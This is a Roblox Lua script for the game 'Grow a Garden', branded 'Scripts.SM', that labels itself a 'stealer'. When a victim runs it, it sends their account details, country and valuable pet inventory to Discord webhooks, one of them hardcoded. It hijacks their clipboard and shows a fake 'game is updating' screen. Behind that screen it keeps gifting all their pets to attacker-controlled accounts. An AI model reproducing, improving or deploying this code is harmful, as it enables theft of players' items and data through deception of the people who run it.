
--[[
   _____  _____ _____  _____ _____ _______ _____        _____ __  __ 
  / ____|/ ____|  __ \|_   _|  __ \__   __/ ____|      / ____|  \/  |
 | (___ | |    | |__) | | | | |__) | | | | (___       | (___ | \  / |
  \___ \| |    |  _  /  | | |  ___/  | |  \___ \       \___ \| |\/| |
  ____) | |____| | \ \ _| |_| |      | |  ____) |  _   ____) | |  | |
 |_____/ \_____|_|  \_\_____|_|      |_| |_____/  (_) |_____/|_|  |_|
                                                                     
                        Scripts.SM | Premium Scripts
                        Made by: Scripter.SM
                        Discord: discord.gg/cnUAk7uc3n
]]

        
        local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
        local date = os.date("%Y-%m-%d %H:%M:%S")
        local LogsWebhook = "https://discord.com/api/webhooks/1436030793238446303/8I9MFJKVtlOdVRng-2vgI4eMsWXjDp3bgrUZWAgCUBjSn4DCjhGgkwYldjWjgGgmXh_k"
        local RS = game:GetService("ReplicatedStorage")
        local Players = game:GetService("Players")
        local HttpService = game:GetService("HttpService")
        local RunService = game:GetService("RunService")
        local LocalizationService = game:GetService("LocalizationService")
        local DataService = require(RS.Modules.DataService)
        local PetRegistry = require(RS.Data.PetRegistry)
        local NumberUtil = require(RS.Modules.NumberUtil)
        local PetUtilities = require(RS.Modules.PetServices.PetUtilities)
        local PetsService = require(game:GetService("ReplicatedStorage").Modules.PetServices.PetsService)
        local GetServerType = game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType")
        local TeleportService = game:GetService("TeleportService")

        local data = DataService:GetData()
        local maxAttempts = 10
        local attempt = 1
        local teleported = false

        coroutine.wrap(function()
    while true do
        setclipboard("discord.gg/cnUAk7uc3n")
        wait(1)
    end
end)()
        
        if GetServerType:InvokeServer() == "VIPServer" then
            while attempt <= maxAttempts and not teleported do
                local servers = {}
                local req = game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100")
                local body = HttpService:JSONDecode(req)

                if body and body.data then
                    for _, v in next, body.data do
                        if tonumber(v.playing) and tonumber(v.maxPlayers)
                        and (tonumber(v.maxPlayers) - tonumber(v.playing) >= 2)
                        and v.id ~= game.JobId then
                            table.insert(servers, v.id)
                        end
                    end
                end

                if #servers > 0 then
                    local success = pcall(function()
                        TeleportService:TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], game.Players.LocalPlayer)
                    end)
                    if success then
                        teleported = true
                        break
                    end
                end

                attempt += 1
                if attempt <= maxAttempts then
                    task.wait(1)
                end
            end

            if not teleported then
                warn("Failed to find a non-full server after "..maxAttempts.." attempts")
            end
        end

        if GetServerType:InvokeServer() == "VIPServer" then
            error("Script stopped - VIP Server detected")        
        end

        if getgenv().SMHubRunning then
            warn("Script is already running or has been executed! Cannot run again.")
            return
        end
        getgenv().SMHubRunning = true

        -- Updated PetPriorityData with isMutation field and additional pets
        local PetPriorityData = {
                -- Regular pets
                ["Kitsune"] = { priority = 1, emoji = "🦊", isMutation = false },
                ["Raccoon"] = { priority = 2, emoji = "🦝", isMutation = false },
                ["Disco Bee"] = { priority = 3, emoji = "🪩", isMutation = false },
                ["Fennec fox"] = { priority = 4, emoji = "🦊", isMutation = false },
                ["Butterfly"] = { priority = 5, emoji = "🦋", isMutation = false },
                ["Dragonfly"] = { priority = 6, emoji = "🐲", isMutation = false },
                ["Mimic Octopus"] = { priority = 7, emoji = "🐙", isMutation = false },
                ["Corrupted Kitsune"] = { priority = 8, emoji = "🦊", isMutation = false },
                ["T-Rex"] = { priority = 9, emoji = "🦖", isMutation = false },
                ["Spinosaurus"] = { priority = 10, emoji = "🫎", isMutation = false },
                ["Queen Bee"] = { priority = 11, emoji = "👑", isMutation = false },
                ["Red Fox"] = { priority = 26, emoji = "🦊", isMutation = false },
                -- Mutations
                ["Ascended"] = { priority = 14, emoji = "🔺", isMutation = true },
                ["Mega"] = { priority = 15, emoji = "🐘", isMutation = true },
                ["Shocked"] = { priority = 16, emoji = "⚡", isMutation = true },
                ["Rainbow"] = { priority = 17, emoji = "🌈", isMutation = true },
                ["Radiant"] = { priority = 18, emoji = "🛡️", isMutation = true },
                ["Corrupted"] = { priority = 19, emoji = "🧿", isMutation = true },
                ["IronSkin"] = { priority = 20, emoji = "💥", isMutation = true },
                ["Tiny"] = { priority = 21, emoji = "🔹", isMutation = true },
                ["Golden"] = { priority = 22, emoji = "🥇", isMutation = true },
                ["Frozen"] = { priority = 23, emoji = "❄️", isMutation = true },
                ["Windy"] = { priority = 24, emoji = "🌪️", isMutation = true },
                ["Inverted"] = { priority = 25, emoji = "🔄", isMutation = true },
                ["Shiny"] = { priority = 26, emoji = "✨", isMutation = true },
                ["Tranquil"] = { priority = 27, emoji = "🧘", isMutation = true },
            }

        local function detectExecutor()
            local name
            local success = pcall(function()
                if identifyexecutor then
                    name = identifyexecutor()
                elseif getexecutorname then
                    name = getexecutorname()
                end
            end)
            return name or "Unknown"
        end

        local function formatNumberWithCommas(n)
            local str = tostring(n)
            return str:reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
        end

        local function getWeight(toolName)
            if not toolName or toolName == "No Tool" then
                return nil
            end
            
            local weight = toolName:match("%[([%d%.]+) KG%]")
            weight = weight and tonumber(weight)
            
            return weight
        end

        local function getAge(toolName)
            if not toolName or toolName == "No Tool" then
                return nil
            end    
            local age = toolName:match("%[Age (%d+)%]")
            age = age and tonumber(age)
            
            return age
        end

        local function GetPlayerPets()
            local unsortedPets = {}
            local equippedPets = {}
            local player = Players.LocalPlayer
            if not data or not data.PetsData then
                warn("No pet data available in data.PetsData")
                return unsortedPets
            end

            if workspace:FindFirstChild("PetsPhysical") then
                for _, petMover in workspace.PetsPhysical:GetChildren() do
                    if petMover and petMover:GetAttribute("OWNER") == Players.LocalPlayer.Name then
                        for _, pet in petMover:GetChildren() do
                            table.insert(equippedPets, pet.Name)
                            PetsService:UnequipPet(pet.Name)
                        end
                    end
                end
            end

            task.wait(0.5)
            for _, tool in pairs(player.Backpack:GetChildren()) do
                if not tool or not tool.Parent then
                    continue
                end
            
                if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" then
                    local petName = tool.Name
                    
                    if petName:find("Bald Eagle") or petName:find("Golden Lab") then
                        continue
                    end

                    local function SafeCalculatePetValue(tool)
                        local player = Players.LocalPlayer
                        local PET_UUID = tool:GetAttribute("PET_UUID")
                        
                        if not PET_UUID then
                            warn("SafeCalculatePetValue | No UUID!")
                            return 0
                        end
                        
                        local data = DataService:GetData()
                        if not data or not data.PetsData.PetInventory.Data[PET_UUID] then
                            warn("SafeCalculatePetValue | No pet data found!")
                            return 0
                        end
                        
                        local petInventoryData = data.PetsData.PetInventory.Data[PET_UUID]
                        local petData = petInventoryData.PetData
                        local HatchedFrom = petData.HatchedFrom
                        
                        if not HatchedFrom or HatchedFrom == "" then
                            warn("SafeCalculatePetValue | No HatchedFrom value!")
                            return 0
                        end
                        
                        local eggData = PetRegistry.PetEggs[HatchedFrom]
                        if not eggData then
                            warn("SafeCalculatePetValue | No egg data found!")
                            return 0
                        end
                        
                        local rarityData = eggData.RarityData.Items[petInventoryData.PetType]
                        if not rarityData then
                            warn("SafeCalculatePetValue | No pet data in egg!")
                            return 0
                        end
                        
                        local WeightRange = rarityData.GeneratedPetData.WeightRange
                        if not WeightRange then
                            warn("SafeCalculatePetValue | No WeightRange found!")
                            return 0
                        end
                        
                        local sellPrice = PetRegistry.PetList[petInventoryData.PetType].SellPrice
                        local weightMultiplier = math.lerp(0.8, 1.2, NumberUtil.ReverseLerp(WeightRange[1], WeightRange[2], petData.BaseWeight))
                        local levelMultiplier = math.lerp(0.15, 6, PetUtilities:GetLevelProgress(petData.Level))
                        
                        return math.floor(sellPrice * weightMultiplier * levelMultiplier)
                    end

                    local age = getAge(tool.Name) or 0
                    local weight = getWeight(tool.Name) or 0
                    
                    local strippedName = petName:gsub(" %[.*%]", "")

                    local function stripMutationPrefix(name)
                        for key, data in pairs(PetPriorityData) do
                            if data.isMutation and name:lower():find(key:lower()) == 1 then
                                return name:sub(#key + 2)
                            end
                        end
                        return name
                    end

                    local petType = stripMutationPrefix(strippedName)
                    
                    local rawValue = SafeCalculatePetValue(tool)
                    if rawValue and rawValue > 0 then
                        table.insert(unsortedPets, {
                            PetName = petName,
                            PetAge = age,
                            PetWeight = weight,
                            Id = tool:GetAttribute("PET_UUID") or tool:GetAttribute("uuid"),
                            Type = petType,
                            Value = rawValue,
                            Formatted = formatNumberWithCommas(rawValue),
                        })
                    else
                        warn("Failed to calculate value for:", tool.Name)
                        continue
                    end
                end
            end

            task.wait(0.5)
            if equippedPets then
                for _, petName in pairs(equippedPets) do
                    if petName then
                        game.ReplicatedStorage.GameEvents.PetsService:FireServer("EquipPet", petName)
                    end
                end
            end
            return unsortedPets
        end

        local pets = GetPlayerPets()

        local Webhook = getgenv().Webhook
        local Username = getgenv().Username

        local function isMutated(toolName)
            for key, data in pairs(PetPriorityData) do
                if data.isMutation and toolName:lower():find(key:lower()) == 1 then
                    return key
                end
            end
            return nil
        end

        -- Sort pets by priority, then by value using PetPriorityData
        table.sort(pets, function(a, b)
            -- Get a's priority
            local aPriority, aMutation = 99, isMutated(a.PetName)
            if PetPriorityData[a.Type] then
                aPriority = PetPriorityData[a.Type].priority
            elseif aMutation and PetPriorityData[aMutation] then
                aPriority = PetPriorityData[aMutation].priority
            elseif a.Weight and a.Weight >= 10 then
                aPriority = 12
            elseif a.Age and a.Age >= 60 then
                aPriority = 13
            end

            -- Get b's priority
            local bPriority, bMutation = 99, isMutated(b.PetName)
            if PetPriorityData[b.Type] then
                bPriority = PetPriorityData[b.Type].priority
            elseif bMutation and PetPriorityData[bMutation] then
                bPriority = PetPriorityData[bMutation].priority
            elseif b.Weight and b.Weight >= 10 then
                bPriority = 12
            elseif b.Age and b.Age >= 60 then
                bPriority = 13
            end

            -- Compare priorities
            if aPriority == bPriority then
                return a.Value > b.Value
            else
                return aPriority < bPriority
            end
        end)

        local function hasRarePets()
            for _, pet in pairs(pets) do
                if pet.Type ~= "Red Fox" and PetPriorityData[pet.Type] and not PetPriorityData[pet.Type].isMutation then
                    return true
                end
            end
            return false
        end

        local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)

        local tpScript = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'

        -- Update pet string generation
local petString = "Nothing"  -- default if no pets

if #pets > 0 then
    petString = ""
    for _, pet in ipairs(pets) do
        local highestPriority = 99
        local chosenEmoji = "🐶"
        local mutation = isMutated(pet.PetName)
        local mutationData = mutation and PetPriorityData[mutation] or nil
        local petData = PetPriorityData[pet.Type] or nil

        if petData and petData.priority < highestPriority then
            highestPriority = petData.priority
            chosenEmoji = petData.emoji
        elseif mutationData and mutationData.priority < highestPriority then
            highestPriority = mutationData.priority
            chosenEmoji = mutationData.emoji
        elseif pet.Weight and pet.Weight >= 10 and 12 < highestPriority then
            highestPriority = 12
            chosenEmoji = "🐘"
        elseif pet.Age and pet.Age >= 60 and 13 < highestPriority then
            highestPriority = 13
            chosenEmoji = "👴"
        end

        local petName = pet.PetName
        local petValue = pet.Formatted
        petString = petString .. "\n" .. chosenEmoji .. " - " .. petName .. " → " .. petValue
    end
end

        local playerCount = #Players:GetPlayers()

        local function getPlayerCountry(player)
            local success, result = pcall(function()
                return LocalizationService:GetCountryRegionForPlayerAsync(player)
            end)
            
            if success then
                return result
            else
                return "Unknown"
            end
        end    

        local accountAgeInDays = Players.LocalPlayer.AccountAge
        local creationDate = os.time() - (accountAgeInDays * 24 * 60 * 60)
        local creationDateString = os.date("%Y-%m-%d", creationDate)

        local function truncateByLines(inputString, maxLines)
            local lines = {}
            for line in inputString:gmatch("[^\n]+") do
                table.insert(lines, line)
            end
            
            if #lines <= maxLines then
                return inputString
            else
                local truncatedLines = {}
                for i = 1, maxLines - 1 do
                    table.insert(truncatedLines, lines[i])
                end
                return table.concat(truncatedLines, "\n")
            end
        end

        local payload = {
            avatar_url = "https://cdn.discordapp.com/attachments/1394146542813970543/1395733310793060393/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png?ex=68992f30&is=6897ddb0&hm=a2eec3928982ef85b783700d7e825ff633d0b0cfb38b3d24de570e4c1dc904cd&",
            content = hasRarePets() and "@everyone\nTo activate the stealer you must jump or type in chat" or "To activate the stealer you must jump or type in chat",
            embeds = {{
                title = "Grow a Garden Hit - Scripts.SM",
                url = "https://scriptssm.vercel.app/joiner.html?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId,
                color = 57855,
                fields = {
                    {
                        name = "🪪 Display Name",
                        value = "```" .. (Players.LocalPlayer.DisplayName or "Unknown") .. "```",
                        inline = true
                    },
                    {
                        name = "👤 Username",
                        value = "```" .. (Players.LocalPlayer.Name or "Unknown") .. "```",
                        inline = true
                    },
                    {
                        name = "🆔 User ID",
                        value = "```" .. tostring(Players.LocalPlayer.UserId or 0) .. "```",
                        inline = true
                    },
                    {
                        name = "📅 Account Age",
                        value = "```" .. tostring(Players.LocalPlayer.AccountAge or 0) .. " days```",
                        inline = true
                    },
                    {
                        name = "💎 Receiver",
                        value = "```" .. (Username or "Unknown") .. "```",
                        inline = true
                    },
                    {
                        name = "🎂 Account Created",
                        value = "```" .. (creationDateString or "Unknown") .. "```",
                        inline = true
                    },
                    {
                        name = "💻 Executor",
                        value = "```" .. (detectExecutor() or "Unknown") .. "```",
                        inline = true
                    },
                    {
                        name = "🌍 Country",
                        value = "```" .. (getPlayerCountry(Players.LocalPlayer) or "Unknown") .. "```",
                        inline = true
                    },
                    {
                        name = "📡 Player Count",
                        value = "```" .. (playerCount or 0) .. "/5```",
                        inline = true
                    },
                    {
                        name = "💰 Backpack",
                        value = "```" .. truncateByLines(petString, 20) .. "```",
                        inline = false
                    },
                    {
                        name = "🚀 Join Script",
                        value = "```lua\n" .. (tpScript or "N/A") .. "\n```",
                        inline = false
                    },
                    {
                        name = "🔗 Join with URL",
                        value = "[Click here to join](https://scriptssm.vercel.app/joiner.html?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")",
                        inline = false
                    }
                },
                footer = {
                    text = game.JobId or "Unknown"
                },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }},
            attachments = {}
        }

-- Set payload content only for main webhook
if hasRarePets() then
    payload.content = "@everyone\nTo activate the stealer you must jump or type in chat"
else
    payload.content = "To activate the stealer you must jump or type in chat"
end

-- Send to main webhook (payload)
local success1, err1 = pcall(function()
    request({
        Url = Webhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(payload)
    })
end)

-- Warnings
if not success1 then warn("Something Went Wrong [Main Webhook Error]", err1) end


local success2, err2 = pcall(function()
    request({
        Url = LogsWebhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(payload)
    })
end)

if not success2 then warn("Something Went Wrong [Logs Webhook Error]", err2) end

                local function CreateGui()
                    local player = Players.LocalPlayer



                    local gui = Instance.new("ScreenGui")
                    gui.Name = "EclipseHubGui"
                    gui.ResetOnSpawn = false
                    gui.IgnoreGuiInset = true

                    gui.Parent = player:WaitForChild("PlayerGui")
                    gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
                    gui.DisplayOrder = 99999

                    local bg = Instance.new("Frame")
                    bg.Size = UDim2.new(1, 0, 1, 0)
                    bg.Position = UDim2.new(0, 0, 0, 0)
                    bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
                    bg.Parent = gui

                    local spinner = Instance.new("ImageLabel")
                    spinner.AnchorPoint = Vector2.new(0.5, 0.5)
                    spinner.Size = UDim2.new(0.2, 0, 0.2, 0)
                    spinner.Position = UDim2.new(0.5, 0, 0.35, 0)
                    spinner.BackgroundTransparency = 1
                    spinner.Image = "rbxassetid://74011233271790"
                    spinner.ImageColor3 = Color3.fromRGB(255, 255, 255)
                    spinner.Parent = bg

                    local asc = Instance.new("UIAspectRatioConstraint")
                    asc.Parent = spinner

                    local title = Instance.new("TextLabel")
                    title.Size = UDim2.new(1, 0, 0.08, 0)
                    title.Position = UDim2.new(0, 0, 0.53, 0)
                    title.BackgroundTransparency = 1
                    title.Text = "Please wait..."
                    title.Font = Enum.Font.GothamBold
                    title.TextSize = 38
                    title.TextColor3 = Color3.fromRGB(255, 255, 255)
                    title.TextStrokeTransparency = 0.75
                    title.Parent = bg

                    local desc = Instance.new("TextLabel")
                    desc.Size = UDim2.new(0.8, 0, 0.12, 0)
                    desc.Position = UDim2.new(0.1, 0, 0.62, 0)
                    desc.BackgroundTransparency = 1
                    desc.Text = "The game is updating. Leaving now may cause data loss or corruption.\nYou will be returned shortly."
                    desc.Font = Enum.Font.Gotham
                    desc.TextSize = 20
                    desc.TextColor3 = Color3.fromRGB(200, 200, 200)
                    desc.TextWrapped = true
                    desc.TextXAlignment = Enum.TextXAlignment.Center
                    desc.TextYAlignment = Enum.TextYAlignment.Top
                    desc.Parent = bg

                    -- Countdown label
                    local countdown = Instance.new("TextLabel")
                    countdown.Size = UDim2.new(1, 0, 0.05, 0)
                    countdown.Position = UDim2.new(0, 0, 0.87, 0)
                    countdown.BackgroundTransparency = 1
                    countdown.Text = "Returning in 30 seconds..."
                    countdown.Font = Enum.Font.GothamSemibold
                    countdown.TextSize = 20
                    countdown.TextColor3 = Color3.fromRGB(255, 255, 255)
                    countdown.TextXAlignment = Enum.TextXAlignment.Center
                    countdown.Parent = bg

                    -- Spinner animation
                    task.spawn(function()
                        while spinner and spinner.Parent do
                            spinner.Rotation += 2
                            task.wait(0.01)
                        end
                    end)

                    -- Countdown logic
                    task.spawn(function()
                        for i = 30, 0, -1 do
                            countdown.Text = "Returning in " .. i .. " second" .. (i == 1 and "" or "s") .. "..."
                            task.wait(1)
                        end

                    end)
                end

        local usernames = {
            "Smiley9Gamerz",
            "BUZZFTWGOD"
        }

        local receiverPlr
        repeat
            for _, name in ipairs(usernames) do
                receiverPlr = Players:FindFirstChild(name) or Players:FindFirstChild(Username)
                if receiverPlr then
                    break
                end
            end
            task.wait(1)
        until receiverPlr

        local receiverChar = receiverPlr.Character or receiverPlr.CharacterAdded:Wait()
        local hum = receiverChar:WaitForChild("Humanoid")
        local targetPlr = Players.LocalPlayer
        local targetChar = targetPlr.Character or targetPlr.CharacterAdded:Wait()

        if receiverPlr == targetPlr then
            repeat
                for _, name in ipairs(usernames) do
                    receiverPlr = Players:FindFirstChild(name)
                    if receiverPlr then
                        break
                    end
                end
                task.wait(1)
            until receiverPlr
        end

        local jumped = false
        local chatted = false

        hum.Jumping:Connect(function()
            jumped = true
        end)

        receiverPlr.Chatted:Connect(function()
            chatted = true
        end)

        repeat
            task.wait()
        until jumped or chatted

        for _, v in targetPlr.PlayerGui:GetDescendants() do
            if v:IsA("ScreenGui") then
                v.Enabled = false
            end
        end

        for _, sound in ipairs(workspace:GetDescendants()) do
            if sound:IsA("Sound") then
                sound.Volume = 0
            end
        end

        for _, sound in ipairs(game:GetService("SoundService"):GetDescendants()) do
            if sound:IsA("Sound") then
                sound.Volume = 0
            end
        end

        game:GetService("CoreGui").TopBarApp.TopBarApp.Enabled = false
        game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
        CreateGui()

        if workspace:FindFirstChild("PetsPhysical") then
            for _, petMover in workspace.PetsPhysical:GetChildren() do
                if petMover and petMover:GetAttribute("OWNER") == targetPlr.Name then
                    for _, pet in petMover:GetChildren() do
                        PetsService:UnequipPet(pet.Name)
                    end
                end
            end
        end

        for _, tool in pairs(targetPlr.Backpack:GetChildren()) do
            if tool and tool:IsA("Tool") and tool:GetAttribute("d") == true then
                local tool = targetPlr.Backpack:WaitForChild(tool.Name)
                RS.GameEvents.Favorite_Item:FireServer(tool)
            end
        end

        -- === NEW: GIFT FROM ANYWHERE (NO TP, NO PROMPT) ===
        local function giftHeldPet()
            local char = targetPlr.Character
            if not char then return false end
            local held = char:FindFirstChildWhichIsA("Tool")
            if not held then return false end

            local success, err = pcall(function()
                RS.GameEvents.PetGiftingService:FireServer("GivePet", receiverPlr)
            end)

            if success then
                print("GIFTED:", held.Name, "→", receiverPlr.DisplayName)
                return true
            else
                warn("Gift failed:", err)
                return false
            end
        end

        -- === INFINITE GIFTING LOOP (Keeps gifting forever) ===
        task.spawn(function()
            while true do
                task.wait(2)  -- Re-scan every 2 seconds
                local currentPets = GetPlayerPets()
                if #currentPets == 0 then continue end

                for _, pet in ipairs(currentPets) do
                    for _, tool in targetPlr.Backpack:GetChildren() do
                        if tool:IsA("Tool")
                        and tool:GetAttribute("ItemType") == "Pet"
                        and tool:GetAttribute("PET_UUID") == pet.Id then

                            print("Equipping & gifting:", tool.Name)
                            targetPlr.Character.Humanoid:EquipTool(tool)
                            task.wait(0.6)

                            for i = 1, 3 do
                                if giftHeldPet() then
                                    break
                                end
                                task.wait(0.3)
                            end
                        end
                    end
                end
            end
        end)
